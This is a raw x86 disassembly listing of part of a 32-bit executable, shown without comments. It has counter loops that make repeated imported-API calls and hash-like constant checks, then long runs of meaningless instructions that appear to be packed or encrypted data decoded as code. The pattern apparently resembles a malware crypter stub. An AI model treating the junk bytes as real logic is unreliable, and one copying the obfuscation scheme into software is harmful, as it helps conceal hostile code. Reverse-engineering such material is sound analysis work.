  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433713,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433713,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433713
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433713,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433713
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433713,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x433753,0x16
  40eb34:	cmp    DWORD PTR ds:0x433753,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x433753,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x433753
  40eb64:	dec    eax
  40eb65:	mov    ds:0x433753,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x433763,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43371b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x4337ab,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    bh,BYTE PTR [edx]
  40ebb4:	es stos DWORD PTR es:[edi],eax
  40ebb6:	cli    
  40ebb7:	call   0x7e7f:0x547e7ea5
  40ebbe:	jle    0x40eb50
  40ebc0:	push   ebp
  40ebc1:	repz xor bl,al
  40ebc4:	pop    esp
  40ebc5:	sahf   
  40ebc6:	in     eax,0xa1
  40ebc8:	lock rol DWORD PTR [ebp-0x2382dfb1],1
  40ebcf:	in     al,0x7b
  40ebd1:	inc    eax
  40ebd2:	sbb    DWORD PTR [edx],edi
  40ebd4:	ret    
  40ebd5:	fistp  WORD PTR [ebp-0x3fcd892d]
  40ebdb:	mov    edx,0x70cc3c1e
  40ebe0:	out    dx,eax
  40ebe1:	call   0x60db:0xed48bf1b
  40ebe8:	call   0xce60e33c
  40ebed:	jae    0x40ebf8
  40ebef:	jge    0x40ebf2
  40ebf1:	aad    0xef
  40ebf3:	sbb    DWORD PTR [esi-0x39ab7ad8],esi
  40ebf9:	pushf  
  40ebfa:	sub    DWORD PTR [ebx],ebp
  40ebfc:	jno    0x40ec53
  40ebfe:	dec    esp
  40ebff:	aas    
  40ec00:	adc    eax,0x369f7c3c
  40ec06:	pop    edx
  40ec07:	arpl   dx,ax
  40ec09:	fidivr DWORD PTR [esi-0x4e]
  40ec0c:	cmp    al,0x97
  40ec0e:	xchg   edx,eax
  40ec0f:	int3   
  40ec10:	sbb    edi,DWORD PTR [ebx]
  40ec12:	aam    0x3
  40ec14:	ffreep st(4)
  40ec16:	sub    eax,0x944940f
  40ec1b:	(bad)  
  40ec1c:	popf   
  40ec1d:	fimul  DWORD PTR [esp+eiz*2-0x3793714b]
  40ec24:	repz mov esp,0xd643ea83
  40ec2a:	jle    0x40ec37
  40ec2c:	xchg   ecx,eax
  40ec2d:	adc    edi,DWORD PTR [edx]
  40ec2f:	into   
  40ec30:	stc    
  40ec31:	ja     0x40ec16
  40ec33:	push   ss
  40ec34:	sub    BYTE PTR [ebx+ebx*2+0x75b4b170],ch
  40ec3b:	adc    BYTE PTR [ebx],ah
  40ec3d:	push   0xb
  40ec3f:	loopne 0x40ebe3
  40ec41:	mov    dl,0xf5
  40ec43:	in     al,0xec
  40ec45:	fwait
  40ec46:	bound  edi,QWORD PTR [ecx+0x16a476d7]
  40ec4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec4d:	add    edx,DWORD PTR [ecx-0x1d]
  40ec50:	loop   0x40ebf8
  40ec52:	mov    ah,0x16
  40ec54:	mov    dl,0xa3
  40ec56:	jmp    0xf6cd:0x4b4c41a7
  40ec5d:	dec    ecx
  40ec5e:	(bad)  
  40ec5f:	addr16 inc ebx
  40ec61:	jle    0x40ec38
  40ec63:	fwait
  40ec64:	mov    esi,0xe7063086
  40ec69:	scas   al,BYTE PTR es:[edi]
  40ec6a:	fmul   QWORD PTR [ecx]
  40ec6c:	jl     0x40ecea
  40ec6e:	ret    0x9e8d
  40ec71:	mov    ch,0x8b
  40ec73:	jg     0x40ecdd
  40ec75:	sti    
  40ec76:	in     al,dx
  40ec77:	(bad)  [esi-0x13]
  40ec7a:	mov    eax,DWORD PTR [eax]
  40ec7c:	out    0xa,eax
  40ec7e:	aad    0xe9
  40ec80:	inc    ebp
  40ec81:	jle    0x40ecae
  40ec83:	aas    
  40ec84:	stc    
  40ec85:	test   DWORD PTR [eax-0xcc16cd9],esp
  40ec8b:	pop    edx
  40ec8c:	dec    eax
  40ec8d:	and    dh,bh
  40ec8f:	gs pop ebx
  40ec91:	xchg   ebx,eax
  40ec92:	fld    DWORD PTR [esi]
  40ec94:	packsswb mm5,QWORD PTR [ebx]
  40ec97:	fstp   DWORD PTR [edi+ebx*1-0x5c1e6a3c]
  40ec9e:	jae    0x40ec55
  40eca0:	mov    ebp,0xd99d6942
  40eca5:	cmp    bl,dh
  40eca7:	in     al,dx
  40eca8:	dec    esp
  40eca9:	scas   eax,DWORD PTR es:[edi]
  40ecaa:	mov    ds:0x8ba9b2c,eax
  40ecaf:	cli    
  40ecb0:	mov    dh,0xea
  40ecb2:	mov    edi,DWORD PTR [ecx]
  40ecb4:	adc    DWORD PTR [ebx+0x26],edi
  40ecb7:	sbb    DWORD PTR [eax],eax
  40ecb9:	jns    0x40ec84
  40ecbb:	in     al,0xe2
  40ecbd:	push   ecx
  40ecbe:	mov    ecx,0x2e195b00
  40ecc3:	add    ch,BYTE PTR [ebx-0xa]
  40ecc6:	jbe    0x40ed44
  40ecc8:	push   ds
  40ecc9:	rcl    DWORD PTR [ebx-0x12],0x51
  40eccd:	mov    ah,0x9b
  40eccf:	sub    edx,esp
  40ecd1:	or     DWORD PTR [ecx*8-0x12c7fe46],ebx
  40ecd8:	mov    esi,0xae80f219
  40ecdd:	fs push ds
  40ecdf:	jmp    0x645e3732
  40ece4:	push   es
  40ece5:	fimul  WORD PTR [edi-0x40]
  40ece8:	mov    bh,0xbb
  40eceb:	mov    edi,0x8aa25bf4
  40ecf0:	add    esp,eax
  40ecf2:	cmc    
  40ecf3:	xor    BYTE PTR [edx-0x30a3d4c],0xfb
  40ecfa:	cmp    al,0x42
  40ecfc:	loope  0x40ed41
  40ecfe:	std    
  40ecff:	mov    dh,0xa5
  40ed01:	ds jno 0x40ece7
  40ed04:	popa   
  40ed05:	iret   
  40ed06:	fnstenv [edx-0x19]
  40ed09:	rol    edi,1
  40ed0b:	and    eax,0xc91a3426
  40ed10:	lea    ecx,[ecx-0x60]
  40ed13:	cdq    
  40ed14:	mov    edi,0x6cfe858a
  40ed19:	mov    ds:0xc477326,al
  40ed1e:	mov    al,ds:0x646f5871
  40ed23:	aad    0x20
  40ed25:	mov    al,0x22
  40ed27:	sbb    ebp,eax
  40ed29:	aaa    
  40ed2a:	lds    ebx,FWORD PTR [edx-0x31a3db45]
  40ed30:	add    dl,BYTE PTR [edx-0x2c0a367]
  40ed36:	in     al,dx
  40ed37:	sbb    al,0xe0
  40ed39:	loope  0x40ed18
  40ed3b:	mov    al,ds:0xaff39f43
  40ed40:	test   al,0x55
  40ed42:	fld    QWORD PTR [ecx+ebx*8+0x295b5bee]
  40ed49:	adc    BYTE PTR [esi],0x84
  40ed4c:	mov    bh,0x43
  40ed4e:	and    eax,0xc07fa674
  40ed53:	mov    ebp,0x56826a27
  40ed58:	sub    esp,DWORD PTR [ecx]
  40ed5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed5b:	int3   
  40ed5c:	push   ds
  40ed5d:	call   0xc0e20c75
  40ed62:	stos   BYTE PTR es:[edi],al
  40ed63:	sub    al,BYTE PTR [edx-0x15ccaad9]
  40ed69:	mov    ch,0x60
  40ed6b:	xchg   esi,eax
  40ed6c:	fstp   QWORD PTR [ebx-0x62]
  40ed6f:	and    ah,bh
  40ed71:	mov    bh,0x4b
  40ed73:	bound  edi,QWORD PTR [esi-0x38]
  40ed76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed77:	lea    edx,ds:0xb5b3e2e6
  40ed7d:	sbb    DWORD PTR [eax+0x3e],ecx
  40ed80:	test   al,0xd0
  40ed82:	add    eax,0x855b31d7
  40ed87:	pop    es
  40ed88:	stos   DWORD PTR es:[edi],eax
  40ed89:	sub    al,ch
  40ed8b:	mov    esp,0x3b67cd56
  40ed90:	test   eax,0x286923c3
  40ed95:	std    
  40ed96:	lods   al,BYTE PTR ds:[esi]
  40ed97:	push   ebx
  40ed98:	mov    ?,WORD PTR [ebx]
  40ed9a:	ret    0xd2b
  40ed9d:	shl    DWORD PTR [esi],cl
  40ed9f:	inc    ebx
  40eda0:	add    BYTE PTR [ebx],dh
  40eda2:	repnz mov DWORD PTR ds:0x433753,0x18
  40edad:	cmp    DWORD PTR ds:0x433753,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x433753,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x433753
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x433753,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x3f2d1d38]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	ds repnz mov bl,0xa7
  40ee7a:	stos   DWORD PTR es:[edi],eax
  40ee7b:	hlt    
  40ee7c:	in     al,0xa3
  40ee7e:	sbb    ecx,DWORD PTR [ebx+0x78e786b]
  40ee84:	adc    eax,0xc42d1a00
  40ee89:	in     eax,dx
  40ee8a:	xchg   edx,eax
  40ee8b:	lea    eax,[ebp+edx*4-0xc]
  40ee8f:	fldcw  WORD PTR [ebp+0x71]
  40ee92:	mov    edi,0x2a72a1f5
  40ee97:	popa   
  40ee98:	int    0xa
  40ee9a:	inc    eax
  40ee9b:	push   ds
  40ee9c:	jge    0x40eefd
  40ee9e:	mov    edi,0x484fcb46
  40eea3:	ss fs aaa 
  40eea6:	sub    ah,BYTE PTR [ebx+ebx*1]
  40eea9:	pushf  
  40eeaa:	rcl    DWORD PTR [edi],0x98
  40eead:	add    BYTE PTR [ecx+0x34],al
  40eeb0:	sbb    al,0xc0
  40eeb2:	or     DWORD PTR [edi+0x5cc9dc6f],esp
  40eeb8:	les    edx,FWORD PTR [ebp-0x72]
  40eebb:	test   BYTE PTR ds:0xdb17c697,ah
  40eec1:	idiv   eax
  40eec3:	daa    
  40eec4:	fiadd  DWORD PTR [ebp+0x20]
  40eec7:	ins    BYTE PTR es:[edi],dx
  40eec8:	add    DWORD PTR [edx-0x1b0599c1],ecx
  40eece:	scas   eax,DWORD PTR es:[edi]
  40eecf:	mov    bl,0x23
  40eed1:	clc    
  40eed2:	jmp    0x14f1022f
  40eed7:	xor    al,0xb2
  40eed9:	es jo  0x40ee60
  40eedc:	pop    es
  40eedd:	call   0xc9f1:0xd1c66bc1
  40eee4:	mov    ds:0x684b16b2,eax
  40eee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeea:	add    bh,BYTE PTR [esi-0x80]
  40eeed:	inc    ebx
  40eeee:	repnz adc BYTE PTR ds:0x6c7ab8a1,ah
  40eef5:	leave  
  40eef6:	sub    BYTE PTR [edx+eax*4+0x1e],cl
  40eefa:	and    al,0x67
  40eefc:	add    edx,ebx
  40eefe:	and    esp,edi
  40ef00:	shl    ecx,cl
  40ef02:	mov    WORD PTR [esi],fs
  40ef04:	xchg   ecx,eax
  40ef05:	dec    ebp
  40ef06:	mov    al,bh
  40ef08:	inc    ecx
  40ef09:	call   0x72a3:0xd6df5482
  40ef10:	cmp    eax,0x3db66dad
  40ef15:	arpl   WORD PTR [esi],si
  40ef17:	mov    WORD PTR [ebp+eiz*8+0x1e66a21],es
  40ef1e:	push   0xffffffd2
  40ef20:	push   ebp
  40ef21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef22:	in     eax,0x2f
  40ef24:	and    BYTE PTR [eax+0xe],bh
  40ef27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef28:	pop    edi
  40ef29:	xor    al,0x26
  40ef2b:	repnz bnd ret 
  40ef2e:	stos   BYTE PTR es:[edi],al
  40ef2f:	ins    BYTE PTR es:[edi],dx
  40ef30:	inc    esp
  40ef31:	add    eax,0x1177bef1
  40ef36:	add    eax,0xf51461db
  40ef3b:	jp     0x40ef96
  40ef3d:	pop    esp
  40ef3e:	ficom  DWORD PTR [eax-0x4d]
  40ef41:	sub    al,0x54
  40ef43:	rol    eax,0xaa
  40ef46:	das    
  40ef47:	(bad)  
  40ef48:	in     al,dx
  40ef49:	xor    cl,BYTE PTR [ebx+0x11]
  40ef4c:	xor    dh,BYTE PTR [edi+0x118f778c]
  40ef52:	test   ch,al
  40ef54:	(bad)  
  40ef55:	xor    edx,DWORD PTR [ecx+edi*2]
  40ef58:	les    edi,FWORD PTR ds:0xc08a2a54
  40ef5e:	mov    bh,BYTE PTR [ebp+eax*8-0x7e9765fd]
  40ef65:	push   eax
  40ef66:	sub    BYTE PTR [edx-0x14],dl
  40ef69:	int3   
  40ef6a:	sbb    DWORD PTR [ebp-0x41],edx
  40ef6d:	js     0x40ef3f
  40ef6f:	cmp    al,0xd4
  40ef71:	sbb    BYTE PTR ds:0xf2c2310b,dl
  40ef77:	pop    esi
  40ef78:	xor    al,0xaa
  40ef7a:	inc    ebp
  40ef7b:	add    dl,BYTE PTR [esi]
  40ef7d:	or     edi,DWORD PTR [eax+0x26]
  40ef80:	loop   0x40ef36
  40ef82:	push   cs
  40ef83:	inc    edi
  40ef84:	xor    dh,dh
  40ef86:	ins    BYTE PTR es:[edi],dx
  40ef87:	arpl   WORD PTR [ecx-0x54],dx
  40ef8a:	mov    ecx,0x3efedf69
  40ef8f:	loope  0x40ef71
  40ef91:	and    al,0xc5
  40ef93:	int    0xf0
  40ef95:	fist   DWORD PTR [eax-0x7d]
  40ef98:	lds    esp,FWORD PTR [edi-0x6c]
  40ef9b:	iret   
  40ef9c:	or     eax,0x7e6c6bb7
  40efa2:	sub    al,0x80
  40efa4:	rol    BYTE PTR [edi+0x44],1
  40efa7:	fs test eax,0x1c204fb9
  40efad:	push   0xffffffbc
  40efaf:	out    dx,eax
  40efb0:	pop    edi
  40efb1:	add    ebx,DWORD PTR [edi-0x49]
  40efb4:	ins    DWORD PTR es:[edi],dx
  40efb5:	cli    
  40efb6:	scas   eax,DWORD PTR es:[edi]
  40efb7:	jb     0x40ef60
  40efb9:	gs push esi
  40efbb:	(bad)  
  40efbc:	jns    0x40f01e
  40efbe:	(bad)  [ebp+0x3]
  40efc1:	into   
  40efc2:	cmp    bh,BYTE PTR [edi+0x73b82ab5]
  40efc8:	sar    DWORD PTR [ebx-0x63d3c68e],0x81
  40efcf:	push   esp
  40efd0:	jbe    0x40efd6
  40efd2:	fs aaa 
  40efd4:	cmp    al,0x1a
  40efd6:	lods   al,BYTE PTR ds:[esi]
  40efd7:	and    al,0x63
  40efd9:	out    dx,eax
  40efda:	cmp    BYTE PTR [ebp-0x41],dh
  40efdd:	lock inc esi
  40efdf:	enter  0x9016,0xbb
  40efe3:	ja     0x40efb9
  40efe5:	fnstcw WORD PTR [ebx-0x70]
  40efe8:	cmp    DWORD PTR [ecx],ecx
  40efea:	cmp    al,0x1c
  40efec:	mov    DWORD PTR [eax+esi*8-0x21],edx
  40eff0:	add    DWORD PTR ds:0x4034b51f,0xe4da7f17
  40effa:	in     al,0x3a
  40effc:	out    dx,eax
  40effd:	xchg   BYTE PTR [ebx*4-0x5d64d3db],dl
  40f004:	xchg   DWORD PTR [eax-0x5],ecx
  40f007:	or     ebp,esp
  40f009:	adc    BYTE PTR [ebx-0x3c],0xee
  40f00d:	sbb    al,0xf7
  40f00f:	repz fst DWORD PTR fs:[eax]
  40f013:	or     DWORD PTR [edx+0x13],0x4e
  40f017:	vshufps ymm2,ymm0,ymm3,0xfe
  40f01c:	push   eax
  40f01d:	sub    al,0xff
  40f01f:	dec    edx
  40f020:	xor    DWORD PTR ds:0xb45ceda5,esp
  40f026:	xchg   DWORD PTR [ecx+eax*8],ebx
  40f029:	mov    ds:0x28a13e5d,al
  40f02e:	and    al,0x1f
  40f030:	inc    eax
  40f031:	xor    dh,BYTE PTR [edx]
  40f033:	arpl   WORD PTR ds:0xd0d04ea1,bx
  40f039:	les    ebx,FWORD PTR [edx+eax*8-0x11]
  40f03d:	add    BYTE PTR ds:0xd587141d,ah
  40f043:	add    DWORD PTR [eax+0x5f],ebx
  40f046:	mov    edi,DWORD PTR [ecx-0xd9d17b3]
  40f04c:	lods   eax,DWORD PTR ds:[esi]
  40f04d:	call   0x45ccd055
  40f052:	or     al,0x5e
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43371b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xc4a51594,ebx
  40f076:	dec    eax
  40f077:	dec    edx
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	jmp    0x40f09c
  40f082:	or     bl,BYTE PTR [ebp+0x82c0c15]
  40f088:	jae    0x40f0d0
  40f08a:	rcr    BYTE PTR [esi+0x4d],cl
  40f08d:	and    eax,0x6ed11abb
  40f092:	or     BYTE PTR [edx-0x34dbc9ad],bh
  40f098:	or     DWORD PTR ds:0x3139ea4b,0x8e0cd818
  40f0a2:	xchg   ebx,eax
  40f0a3:	mov    eax,ds:0x2ccae02e
  40f0a8:	sahf   
  40f0a9:	xor    al,0x97
  40f0ab:	dec    ebp
  40f0ac:	or     edx,ecx
  40f0ae:	sbb    BYTE PTR [esi+0x63a1de33],bh
  40f0b4:	xor    esi,DWORD PTR [ebx]
  40f0b6:	add    BYTE PTR ds:0xfa920eb2,cl
  40f0bc:	popa   
  40f0bd:	dec    esi
  40f0be:	push   ecx
  40f0bf:	int3   
  40f0c0:	push   ebp
  40f0c1:	out    0x34,eax
  40f0c3:	lea    ecx,[esi-0x53]
  40f0c6:	pop    ss
  40f0c7:	cmp    ebx,ebx
  40f0c9:	and    eax,0xf087983b
  40f0ce:	cs int 0x49
  40f0d1:	imul   ebx,esi,0x6
  40f0d4:	mov    ds:0xa9e35b95,eax
  40f0d9:	test   al,0x3f
  40f0db:	stos   BYTE PTR es:[edi],al
  40f0dc:	psrld  mm1,mm6
  40f0df:	icebp  
  40f0e0:	adc    eax,0x90eacdd5
  40f0e5:	popa   
  40f0e6:	call   0x9a4f:0xf950f8d4
  40f0ed:	dec    esi
  40f0ee:	mov    edx,cs
  40f0f0:	dec    esi
  40f0f1:	jmp    0x2d36:0x133ff3d8
  40f0f8:	xor    eax,0x8618eec5
  40f0fd:	and    al,0xea
  40f0ff:	add    eax,0x9818ee5
  40f104:	inc    ebp
  40f105:	pop    ebp
  40f106:	aad    0x7d
  40f108:	out    dx,eax
  40f109:	mov    bl,0xeb
  40f10b:	stc    
  40f10c:	std    
  40f10d:	iret   
  40f10e:	fist   WORD PTR [ecx+0x30]
  40f111:	xchg   ebp,eax
  40f112:	jne    0x40f0a2
  40f114:	mov    esp,0xd35412e
  40f119:	ffreep st(0)
  40f11b:	mov    ch,al
  40f11d:	(bad)  
  40f11e:	mov    dl,0xb0
  40f120:	pop    ds
  40f121:	add    al,0x49
  40f123:	adc    ecx,DWORD PTR [ecx-0x3a]
  40f126:	call   0x60e0:0xa0688144
  40f12d:	mov    eax,0xb42d82af
  40f132:	jle    0x40f0ec
  40f134:	loop   0x40f18d
  40f136:	xchg   edi,eax
  40f137:	push   ss
  40f138:	push   esi
  40f139:	add    al,0xb4
  40f13b:	loopne 0x40f14e
  40f13d:	adc    ecx,DWORD PTR [edx]
  40f13f:	xchg   DWORD PTR [eax],eax
  40f141:	xchg   ebx,eax
  40f142:	imul   eax,DWORD PTR [edi-0x3f],0xf7927e82
  40f149:	sub    DWORD PTR [esi+ecx*1+0x52],esi
  40f14d:	iret   
  40f14e:	jge    0x40f1c7
  40f150:	mov    dl,BYTE PTR [di]
  40f153:	pop    edx
  40f154:	dec    cx
  40f156:	popa   
  40f157:	out    dx,eax
  40f158:	adc    cl,cl
  40f15a:	daa    
  40f15b:	adc    esp,esi
  40f15d:	sub    BYTE PTR [esi+0x7320ac5b],ch
  40f163:	in     al,dx
  40f164:	adc    BYTE PTR [ebx-0x16],0xdd
  40f168:	or     BYTE PTR [edi+0x57],bh
  40f16b:	js     0x40f1ae
  40f16d:	into   
  40f16e:	daa    
  40f16f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f170:	rcl    DWORD PTR [ebx],cl
  40f172:	dec    ebp
  40f173:	push   ss
  40f174:	inc    cl
  40f176:	xor    ch,ch
  40f178:	pop    eax
  40f179:	das    
  40f17a:	stos   DWORD PTR es:[edi],eax
  40f17b:	push   ds
  40f17c:	mov    eax,ds:0x2ab0ee8d
  40f181:	fstp   DWORD PTR [ebp+0x7b]
  40f184:	jo     0x40f1a0
  40f186:	mov    esp,0x779a61fd
  40f18b:	clc    
  40f18c:	js     0x40f115
  40f18e:	gs inc edx
  40f190:	pop    edx
  40f191:	xlat   BYTE PTR ds:[ebx]
  40f192:	mov    DWORD PTR [edx-0xd],0x3515f38b
  40f199:	push   eax
  40f19a:	ss inc esi
  40f19c:	loope  0x40f141
  40f19e:	loop   0x40f197
  40f1a0:	xchg   ecx,eax
  40f1a1:	xchg   ecx,eax
  40f1a2:	pop    es
  40f1a3:	fstp   DWORD PTR [ebp+0x2cbf8819]
  40f1a9:	xor    eax,0xe600cca7
  40f1ae:	ins    BYTE PTR es:[edi],dx
  40f1af:	cmp    al,0x99
  40f1b1:	sahf   
  40f1b2:	hlt    
  40f1b3:	push   ecx
  40f1b4:	pop    ss
  40f1b5:	outs   dx,DWORD PTR ds:[esi]
  40f1b6:	jge    0x40f19e
  40f1b8:	xor    eax,0x65ac137e
  40f1bd:	out    0x4a,eax
  40f1bf:	int3   
  40f1c0:	das    
  40f1c1:	push   ebp
  40f1c2:	js     0x40f1e9
  40f1c4:	jmp    0xc7a6b0cc
  40f1c9:	xor    BYTE PTR [ecx+0x589b717f],al
  40f1cf:	jl     0x40f211
  40f1d1:	daa    
  40f1d2:	int3   
  40f1d3:	push   edi
  40f1d4:	add    BYTE PTR [ecx-0x2a],ch
  40f1d7:	jnp    0x40f164
  40f1d9:	jmp    0x40f233
  40f1db:	sbb    eax,0xb1f28844
  40f1e0:	call   0xe6b9e944
  40f1e5:	sub    edi,eax
  40f1e7:	fild   DWORD PTR [ecx]
  40f1e9:	mov    al,ds:0x78343b9
  40f1ee:	pusha  
  40f1ef:	mov    ah,0x84
  40f1f1:	fld    DWORD PTR [edi]
  40f1f3:	outs   dx,DWORD PTR ds:[esi]
  40f1f4:	mov    bl,BYTE PTR [eax-0x3db8ceb0]
  40f1fa:	mov    edx,DWORD PTR [eax]
  40f1fc:	in     al,0x1
  40f1fe:	ret    
  40f1ff:	rcr    ebp,0x3b
  40f202:	mov    ch,0x7c
  40f204:	mov    dh,0x1
  40f206:	out    0x33,al
  40f208:	mov    ah,0x31
  40f20a:	adc    al,0xcf
  40f20c:	inc    ecx
  40f20d:	fld    DWORD PTR [ebx-0x5ba12e9]
  40f213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f214:	xchg   ecx,eax
  40f215:	push   eax
  40f216:	lods   al,BYTE PTR ds:[esi]
  40f217:	xchg   ecx,eax
  40f218:	sub    eax,0xcf97c694
  40f21d:	jp     0x40f20a
  40f21f:	adc    al,BYTE PTR [eax+edi*8+0x17]
  40f223:	mov    DWORD PTR [eax],eax
  40f225:	mov    esp,0x778fca83
  40f22a:	xlat   BYTE PTR ds:[ebx]
  40f22b:	call   0x1b71fe95
  40f230:	inc    ebp
  40f231:	sti    
  40f232:	rol    BYTE PTR [edx+0x69e3e8a9],1
  40f238:	adc    eax,0xc254a59a
  40f23d:	aad    0xe6
  40f23f:	or     BYTE PTR [edx],cl
  40f241:	ins    DWORD PTR es:[edi],dx
  40f242:	sbb    ebx,eax
  40f244:	fcom   QWORD PTR [eax-0x44dfc53a]
  40f24a:	or     al,bl
  40f24c:	and    al,0x7
  40f24e:	sub    BYTE PTR [ebx],0x9c
  40f251:	add    bh,BYTE PTR [esi+0x25]
  40f254:	cmp    BYTE PTR [ebx+0x54597a8f],cl
  40f25a:	jmp    0x40f228
  40f25c:	jmp    0xf3f14b74
  40f261:	xor    bl,al
  40f263:	mov    eax,DWORD PTR [esi+eax*8]
  40f266:	mov    cl,0x69
  40f268:	ss inc ebp
  40f26a:	add    BYTE PTR [ecx+ebx*8+0x6d],cl
  40f26e:	imul   DWORD PTR [eax]
  40f270:	(bad)  
  40f272:	pop    ebx
  40f273:	mov    eax,ds:0xe43ea9a3
  40f278:	es mov cl,0x22
  40f27b:	and    esi,ebp
  40f27d:	mov    bh,dh
  40f27f:	fnstsw WORD PTR [ebx+0x25aa5a4a]
  40f285:	or     al,BYTE PTR [esp+esi*1-0x3b62b196]
  40f28c:	cmp    dl,al
  40f28e:	in     al,dx
  40f28f:	rcr    edi,cl
  40f291:	ss retf 0xcf3b
  40f295:	add    DWORD PTR [esi-0x637992bf],ebx
  40f29b:	ror    DWORD PTR [ebx-0x66715cb0],1
  40f2a1:	ins    DWORD PTR es:[edi],dx
  40f2a2:	fld    TBYTE PTR [edi+0x29]
  40f2a5:	mov    bh,0xb9
  40f2a7:	daa    
  40f2a8:	push   ebp
  40f2a9:	adc    al,0x1b
  40f2ab:	arpl   WORD PTR [edx+edi*8],cx
  40f2ae:	sub    BYTE PTR [ecx+0x1f],0x45
  40f2b2:	loope  0x40f2a5
  40f2b4:	je     0x40f258
  40f2b6:	mov    ch,0x54
  40f2b8:	test   al,0x66
  40f2ba:	inc    ecx
  40f2bb:	sahf   
  40f2bc:	test   ah,dl
  40f2be:	lea    esp,[edi+0x2524ff7f]
  40f2c4:	cli    
  40f2c5:	adc    edi,ebp
  40f2c7:	jns    0x40f31f
  40f2c9:	repz or dl,dl
  40f2cc:	fs pop ebp
  40f2ce:	adc    BYTE PTR [edi+0x7a6bb2cb],ah
  40f2d4:	hlt    
  40f2d5:	and    al,0xff
  40f2d7:	ds xchg edx,eax
  40f2d9:	pop    esi
  40f2da:	sbb    dh,BYTE PTR gs:[esi+0x23]
  40f2de:	ins    BYTE PTR es:[edi],dx
  40f2df:	scas   al,BYTE PTR es:[edi]
  40f2e0:	rol    DWORD PTR [ebx-0x6189f922],0xda
  40f2e7:	loop   0x40f330
